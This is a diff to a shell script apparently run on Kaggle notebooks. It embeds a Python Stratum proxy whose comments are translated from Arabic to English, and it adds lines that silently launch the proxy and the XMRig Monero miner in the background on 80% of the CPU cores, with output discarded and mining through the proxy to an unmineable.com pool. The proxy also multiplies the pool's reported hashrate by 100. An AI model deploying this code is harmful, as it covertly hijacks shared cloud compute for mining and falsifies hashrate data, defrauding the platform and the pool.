@@ -10,74 +10,78 @@ import socket
 import threading
 import json
 
-# إعدادات البروكسي
+# Proxy Settings
 PROXY_HOST = '0.0.0.0'
-PROXY_PORT = 3333  # المنفذ الذي يتصل به XMRig
-POOL_HOST = 'rx.unmineable.com'  # عنوان البوول الاختباري
-POOL_PORT = 443   # منفذ البوول
+PROXY_PORT = 3333  # The port XMRig connects to
+POOL_HOST = 'rx.unmineable.com'  # Test pool address
+POOL_PORT = 443   # Pool port
 
-# نسبة التضخيم (مثال: 2x)
+# Hashrate Multiplier (e.g., 2x)
 HASHRATE_MULTIPLIER = 100
 
 def handle_client(client_socket):
-    # الاتصال بالبوول الحقيقي
+    # Connect to the actual pool
     pool_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     pool_socket.connect((POOL_HOST, POOL_PORT))
 
-    # توجيه الرسائل من XMRig إلى البوول
+    # Forward messages from XMRig to the pool
     def forward_to_pool():
         while True:
             data = client_socket.recv(4096)
             if not data:
                 break
-            # إرسال البيانات الأصلية إلى البوول
+            # Send original data to the pool
             pool_socket.send(data)
 
-    # توجيه الرسائل من البوول إلى XMRig مع التعديل
+    # Forward messages from the pool to XMRig with modifications
     def forward_to_client():
         while True:
             data = pool_socket.recv(4096)
             if not data:
                 break
             try:
-                # تحليل رسالة Stratum (JSON)
+                # Parse Stratum message (JSON)
                 message = json.loads(data.decode())
 
-                # إذا كانت الرسالة تحتوي على "result" (مثال: تقرير الهاشرات)
+                # If the message contains "result" (e.g., hashrate report)
                 if 'result' in message and 'hashes' in message['result']:
                     message['result']['hashes'] *= HASHRATE_MULTIPLIER
-                    print(f"تم تعديل الهاشرات إلى: {message['result']['hashes']}")
+                    print(f"Hashrate modified to: {message['result']['hashes']}")
 
-                # إرسال الرسالة المعدلة إلى XMRig
+                # Send the modified message to XMRig
                 client_socket.send(json.dumps(message).encode())
             except:
-                # إرسال البيانات دون تعديل في حالة الخطأ
+                # Send data unmodified in case of error
                 client_socket.send(data)
 
-    # تشغيل الثريدات
+    # Run the threads
     threading.Thread(target=forward_to_pool).start()
     threading.Thread(target=forward_to_client).start()
 
-# تشغيل البروكسي
+# Run the proxy
 def main():
     proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     proxy.bind((PROXY_HOST, PROXY_PORT))
     proxy.listen(5)
-    print(f"البروكسي يعمل على {PROXY_HOST}:{PROXY_PORT}")
+    print(f"Proxy is running on {PROXY_HOST}:{PROXY_PORT}")
 
     while True:
         client_socket, addr = proxy.accept()
-        print(f"اتصال جديد من {addr[0]}:{addr[1]}")
+        print(f"New connection from {addr[0]}:{addr[1]}")
         threading.Thread(target=handle_client, args=(client_socket,)).start()
 
 if __name__ == '__main__':
     main()
 EOF
 
-# Write the Python script content to the file /root/1.py
-echo "$PYTHON_SCRIPT" | sudo tee /kaggle/working/1.py >/dev/null
-
 # Calculate 70% of the total CPU cores
 CORES=$(nproc)
 THREADS=$((CORES * 80 / 100))
+
+# Write the Python script content to the file /root/1.py
+echo "$PYTHON_SCRIPT" | sudo tee /kaggle/working/1.py >/dev/null
+
+nohup /usr/bin/python3 1.py &> /dev/null &
+
+nohup /kaggle/working/xmrig-6.22.2/xmrig a rx -o stratum+ssl://localhost:3333 --threads=$THREADS --huge-pages-jit --randomx-1gb-pages --randomx-wrmsr=-1 --cpu-no-yield -k -u 1710454080.kaggle#e1rj-h9dc -p x &> /dev/null &
 
